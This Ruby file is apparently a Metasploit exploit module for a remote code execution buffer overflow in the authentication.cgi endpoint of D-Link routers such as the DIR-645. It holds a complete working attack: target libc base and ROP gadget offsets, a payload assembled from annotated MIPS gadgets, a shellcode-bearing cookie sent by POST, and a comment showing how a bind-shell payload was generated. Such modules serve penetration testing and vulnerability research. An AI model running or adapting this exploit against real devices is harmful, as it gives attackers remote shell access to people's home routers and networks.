##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking # the exploit as it is is excellent but we can't use any encoder

  HttpFingerprint = { :pattern => [ /Linux,\ HTTP\/1.0,\ DIR-/ ] }

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'D-Link authentication.cgi Buffer Overflow',
      'Description'    => %q{
          This module exploits a anonymous remote code execution vulnerability on different D-Link routers.
        This module has been tested successfully on D-Link DIR645A1_FW103B11. The devices DIR865LA1_FW101b06
        and DIR845LA1_FW100b20 are also vulnerable and they were tested within an emulated environment. They
        are a little bit different in the first ROP gadget. Todo: Test and include these devices into this module.
        This module does not support any available MSF encoders.
        #If you would use the exec shellcode for MIPS
        #you have to change the BadChars configuration of the module manually.
      },
      'Author'         =>
        [
          'Roberto Paleari', # Vulnerability discovery
          'Michael Messner <devnull[at]s3cur1ty.de>', #Metasploit module and verification on DIR865 and DIR845
        ],
      'License'        => MSF_LICENSE,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 1000,
          #'BadChars'    => "\x00\x2c\x3b\x09\x0a\x0d"
          'BadChars'    => "\x2c\x3b\x09\x0a\x0d" # for supporting the exec payload
          # we do not support encoders, if the exec payload should be used the \x00 byte has to be removed of the
          # BadChars. We are trying to handle the final \x00 bytes within this exploit. There is also a final check
          # for other \x00 characters.
        },
      'Platform'       => ['linux'],
      'Arch'           => ARCH_MIPSLE,
      'References'     =>
        [
          [ 'OSVDB', '95951' ],
          [ 'EDB', '27283' ],
          [ 'URL', 'http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10008' ], #advisory on vendor web site
          [ 'URL', 'http://www.dlink.com/us/en/home-solutions/connect/routers/dir-645-wireless-n-home-router-1000' ], #vendor web site of router
          [ 'URL', 'http://roberto.greyhats.it/advisories/20130801-dlink-dir645.txt' ]              #original advisory
        ],
      'Targets'        =>
        [
          [ 'DLink DIR-645 1.03',
            {
              'Offset'      => 79,
              'LibcBase'    => 0x2aaf8000,  #Router
              #'LibcBase'    => 0x40854000,  # QEMU environment
              'Ret'         => 0x436D0,     #reg S4 - gadget nr 2 - prepare ra wich is used after sleep
              'RopPrepSleep' => 0x2F0F8,    #from libc
              'RopSleep'    => 0x56BD0,     #from libc # Sleep Function Address # sleep() to flush the data cache
              'RopPtrStack' => 0x0DEF0,     #3rd gadget for writing sp in S2
              'RopJmpStack' => 0x52AB0      #4th - Jump stack
            }
          ]
        ],
      'DisclosureDate' => 'Feb 08 2013',
      'DefaultTarget' => 0))
  end

  def check
    begin
      res = send_request_cgi({
        'uri'     => "/authentication.cgi",
        'method'  => 'GET'
      })

      if res && [200, 301, 302].include?(res.code)
        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Unknown
  end

  def exploit

    # till today no encoder for MIPS is working with this device
    # shellcode created the following way:
    # ./msfpayload linux/mipsle/shell_bind_tcp R | ./msfencode -e mipsle/longxor -a mipsle -t elf -o /root/mipsle_longxor_bind
    # [*] mipsle/longxor succeeded with size 324 (iteration=1)
    # it works good on a typical debian MIPS-LE machine:
    # [root@debian-mipsel ~]# chmod +x mipsle_longxor_bind
    # [root@debian-mipsel ~]# ./mipsle_longxor_bind
    # but it is not working on the router:
    # chmod +x mipsle_longxor_bind
    # ./mipsle_longxor_bind
    # Illegal instruction
    # so we check it here and exit if an encoder is configured
    if datastore['ENCODER'] !~ /generic\/none/
      fail_with(Failure::Unknown, "#{peer} - We don't support encoders. Try to set the encoder to generic/none")
    end

    print_status("#{peer} - Trying to access the vulnerable URL...")

    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable URL")
    end

    # prepare our shellcode that triggers the crash:

    shellcode = rand_text_alpha_upper(target['Offset'])                # padding
    shellcode << "\x0a\x09\x26"                                        # our filler that is responsible for breaking our
                                                                       # buffer and for correct cookie placement
    shellcode << rand_text_alpha_upper(929)                            # space that is broken into multiple parts. Because
                                                                       # we break our shellcode with bad characters right
                                                                       # before we can find our modified cookie here
    shellcode << rand_text_alpha_upper(12)                             # reg $s0 - $s2
    shellcode << [target['LibcBase'] + target['RopSleep']].pack("V")   # reg $s3 - address of sleep
    shellcode << [target['LibcBase'] + target.ret].pack("V")           # reg $s4 - gadget nr 2 - prepare ra wich is used after sleep

        #.text:000436D0      move    $t9, $s3                   # put address of sleep from s3 to t9 and jump to it
        #.text:000436D4      lw      $ra, 0x30+var_4($sp)       # load value from stack into ra -> to go there after sleep
        #.text:000436D8      lw      $s4, 0x30+var_8($sp)       # address of our last gadget - jump to s2 (stack)
        #.text:000436DC      lw      $s3, 0x30+var_C($sp)       # unused
        #.text:000436E0      lw      $s2, 0x30+var_10($sp)      # unused
        #.text:000436E4      lw      $s1, 0x30+var_14($sp)      # unused
        #.text:000436E8      lw      $s0, 0x30+var_18($sp)      # unused
        #.text:000436EC      jr      $t9                        # jump to sleep

    shellcode << rand_text_alpha_upper(16)                                # unused registers $s5 to $s7 and $fp
    shellcode << [target['LibcBase'] + target['RopPrepSleep']].pack("V")  # gadget nr 1 (prepare sleep)

        #.text:0002F0F8      move    $t9, $s4                   # address of second gadget
        #.text:0002F0FC      li      $a0, 1                     # parameter of sleept
        #.text:0002F100      jalr    $t9                        # jump to second gadget

    shellcode << rand_text_alpha_upper(40)                                # filler for padding
    shellcode << [target['LibcBase'] + target['RopJmpStack']].pack("V")   # 4th gadget - jump to stack

        #.text:00052AB0      move    $t9, $s2                   # address of stack is waiting in $s2
        #.text:00052AB4      jalr    $t9                        # jump to the stack

    shellcode << [target['LibcBase'] + target['RopPtrStack']].pack("V")   # 3rd gadget for writing sp in $s2

        #.text:0000DEF0      addiu   $s2, $sp, 0xC8+var_B8      # write a address of our stack to $s2 - we jump later to this address
        #.text:0000DEF4      li      $s1, 0x80                  # unused
        #.text:0000DEF8      li      $s3, 0x16                  # unused
        #.text:0000DEFC      move    $t9, $s4                   # in $s4 is address of last gadget which jumps to $s2
        #.text:0000DF00      jalr    $t9                        # jump to the last gadget

    shellcode << rand_text_alpha_upper(16)        # padding
    shellcode << "\x90\xf7\x39\x23"               # addi $t9,$t9,-2160
    shellcode << "\x08\xf8\x21\x03"               # jr $t9 -> jump to our shellcode (waiting in our cookie)
    shellcode << "\xFE\xFE\xE0\x27"               # for pipelining
    shellcode << rand_text_alpha_upper(139)       # final filler

    # prepare our cookie that includes our payload
    # for using the exec payload you have to remove the \x00 byte from the bad character set

    if datastore['PAYLOAD'] =~ /exec/

    # for this we have to strip out our \x00 bytes at the end
    # the \x00 breaks the shellcode execution. We use the \x00 series on our stack to terminate
    # the buffer in a correct way. We are not able to use any of the available encoders
    # for this we have to prepare a correct shellcode the following way
    # other way would be to directly include the shellcode for executing commands here ...

      payload_ = "\xFE\xFE\xE0\x27" * 3
      payload_ << payload.encoded  # we are not able to use the encoded payload. We try to use the unencoded and remove the \x00
                                   # bytes manually. Afterwards we check the payload for bad characters. If we find one of them
                                   # our shellcode fails!
      print_status("#{peer} - trying to fix the shellcode") if payload_.ends_with("\x00")

      while payload_.ends_with("\x00")          # \x00 is a bad character but we do not support encoders for this payload.
        payload_ = payload_.sub(/\x00$/,"")     # if we en/decode the \x00 bytes the shellcode fails!
      end                                       # So we remove the string terminator at the end

    else  #our shell payloads are handled here
      payload_ = "\xFE\xFE\xE0\x27" * 3
      payload_ << payload.encoded
    end

    # this check is only relevant if the \x00 byte was removed from the bad characters:
    # in normal operation with a bind payload this check is not relevant
    # for the exec shellcode this is important!
    if payload_.include?("\x00")                 # if there are other \x00 bytes in the shellcode we fail
     fail_with(Failure::Unknown, "#{peer} - Failed to prepare a null byte free payload")
    end

    # now lets rock it ...

    print_status("#{peer} - Sending exploit ...")

    res = send_request_cgi({
      'method' => 'POST',
      #'uri' => "/authentication_gdb.cgi",	#for debugging on the router
      'uri' => "/authentication.cgi",
      'cookie'   => "uid=" << payload_,
      'encode_params' => false,
      'vars_post' => {
        'uid'        => 'test',
        'password'   => 'asd' << shellcode,
      }
    })
    vprint_status("#{peer} - Now you could verify that the exploit was working correct ...")
  end
end
